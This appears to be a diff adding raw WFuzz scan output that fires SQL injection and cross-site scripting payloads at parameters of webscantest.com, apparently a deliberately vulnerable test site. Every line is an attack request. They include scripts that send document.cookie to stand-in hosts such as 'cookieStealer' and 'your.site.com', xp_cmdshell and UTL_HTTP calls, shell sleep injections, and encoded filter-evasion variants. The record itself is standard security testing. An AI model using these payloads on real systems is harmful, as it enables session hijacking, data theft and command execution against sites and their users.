+       23            200           35 L     103     1433         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+       24            200           35 L     103     1374         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC=
+       25            200           35 L     104     1376         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC="%20
+       26            200           35 L     103     1460         None    http://www.webscantest.com/business/account.php?accountId="><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+       27            200           35 L     103     1415         None    http://www.webscantest.com/business/account.php?accountId='%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+       28            200           35 L     103     1461         None    http://www.webscantest.com/business/account.php?accountId=%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+       29            200           35 L     102     1594         None    http://www.webscantest.com/business/account.php?accountId=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+       30            200           35 L     102     1378         None    http://www.webscantest.com/business/account.php?accountId='';!--"<XSS>=&{()}
+
+WFuzz -- SQL Injection on URL parameters, URL = http://www.webscantest.com/csrf/session.php/session.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L      96     1289         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='
+        2            200           35 L      96     1290         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=--
+        3            200           35 L      95     1288         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=
+        4            200           35 L      97     1292         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20--
+        5            200           35 L      96     1292         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=--';
+        6            200           35 L      97     1291         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20;
+        7            200           35 L      97     1298         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=\x3D%20\x3B'
+        8            200           35 L      98     1309         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=\x27\x4F\x52%20SELECT%20*
+        9            200           35 L      97     1297         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=\x3D%20\x27
+       10            200           35 L      98     1300         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='or%20select%20*
+       11            200           35 L      96     1296         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=admin'--
+       12            200           35 L      98     1297         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%20''='
+       13            200           35 L      98     1299         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%20'x'='x
+       14            200           35 L      98     1301         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=')%20or%20('x'='x
+       15            200           35 L      98     1296         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=0%20or%201=1
+       16            200           35 L      99     1299         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%200=0%20--
+       17            200           35 L      97     1295         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=or%200=0%20
+       18            200           35 L      98     1298         None    http://www.webscantest.com/csrf/session.php/session.php?jsession="%20or%201=1--
+       19            200           35 L      98     1302         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%20'1'='1'--
+       20            200           35 L      99     1300         None    http://www.webscantest.com/csrf/session.php/session.php?jsession="'%20or%201%20--'"
+       21            200           35 L      97     1296         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=or%201=1--
+       22            200           35 L      97     1294         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=or%201=1
+       23            200           35 L     100     1304         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%201=1%20or%20''='
+       24            200           35 L      99     1301         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=hi"%20or%201=1%20--
+       25            200           35 L      98     1303         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=hi')%20or%20('a'='a
+       26            200           35 L      98     1304         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='hi'%20or%20'x'='x';
+       27            200           35 L      96     1298         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=,@variable
+       28            200           35 L      96     1293         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=PRINT
+       29            200           35 L      97     1304         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=PRINT%20@@variable
+       30            200           35 L      96     1297         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=@variable
+       31            200           35 L      96     1294         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=select
+       32            200           35 L      96     1291         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=asc
+       33            200           35 L      96     1295         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=replace
+       34            200           35 L     100     1309         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%20username%20like%20'%
+       35            200           35 L     100     1306         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%20uname%20like%20'%
+       36            200           35 L     100     1307         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%20userid%20like%20'%
+       37            200           35 L     100     1305         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20or%20user%20like%20'%
+       38            200           35 L      98     1315         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=';%20exec%20master..xp_cmdshell
+       39            200           35 L      98     1306         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=';%20exec%20xp_regread
+       40            200           35 L      99     1342         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=t'exec%20master..xp_cmdshell%20'nslookup%20www.google.com'--
+       41            200           35 L      96     1301         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=--sp_password
+       42            200           35 L      99     1303         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20(select%20top%201
+       43            200           35 L      99     1306         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%20UNION%20ALL%20SELECT
+       44            200           35 L      96     1307         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='||UTL_HTTP.REQUEST
+       45            200           35 L      96     1303         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=to_timestamp_tz
+       46            200           35 L      96     1300         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='sqlattempt1
+       47            200           35 L      97     1300         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=%20$(sleep%2050)
+       48            200           35 L      97     1299         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=%20'sleep%2050'
+       49            200           35 L      96     1304         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=char%4039%41%2b%40SELECT
+
+WFuzz -- XSS Injection, URL = http://www.webscantest.com/csrf/session.php/session.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L      96     1306         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=\";alert('XSS');//
+        2            200           35 L      96     1328         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+        3            200           35 L      96     1318         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<script>alert("WXSS")</script>
+        4            200           35 L      96     1299         None    http://www.webscantest.com/csrf/session.php/session.php?jsession="><script>"
+        5            200           35 L      96     1323         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<<script>alert("WXSS");//<</script>
+        6            200           35 L      96     1327         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<script>alert(document.cookie)</script>
+        7            200           35 L      96     1329         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='><script>alert(document.cookie)</script>
+        8            200           35 L      96     1330         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='><script>alert(document.cookie);</script>
+        9            200           35 L      96     1319         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=%3cscript%3ealert("WXSS");%3c/script%3e
+       10            200           35 L      97     1319         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+       11            200           35 L      95     1288         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=&ltscript&gtalert(document.cookie);</script>
+       12            200           35 L      96     1336         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<xss><script>alert('WXSS')</script></vulnerable>
+       13            200           35 L      97     1314         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+       14            200           35 L      97     1322         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC=javascript:alert('WXSS')>
+       15            200           35 L      97     1326         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC=`javascript:alert("'WXSS'")`>
+       16            200           35 L      97     1325         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC="javascript:alert('WXSS');">
+       17            200           35 L      97     1333         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC='javascript:alert(document.cookie)'>
+       18            200           35 L      97     1323         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC="javascript:alert('WXSS')"
+       19            200           35 L      97     1329         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+       20            200           35 L      97     1345         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+       21            200           35 L      97     1301         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC="jav
+       22            200           35 L      97     1299         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC="%20
+       23            200           35 L      97     1327         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20DYNSRC="javascript:alert('WXSS')">
+       24            200           35 L      97     1356         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+       25            200           35 L      97     1297         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=<IMG%20SRC=
+       26            200           35 L      97     1338         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+       27            200           35 L      96     1517         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+       28            200           35 L      97     1383         None    http://www.webscantest.com/csrf/session.php/session.php?jsession="><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+       29            200           35 L      97     1384         None    http://www.webscantest.com/csrf/session.php/session.php?jsession=%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+       30            200           35 L      96     1301         None    http://www.webscantest.com/csrf/session.php/session.php?jsession='';!--"<XSS>=&{()}
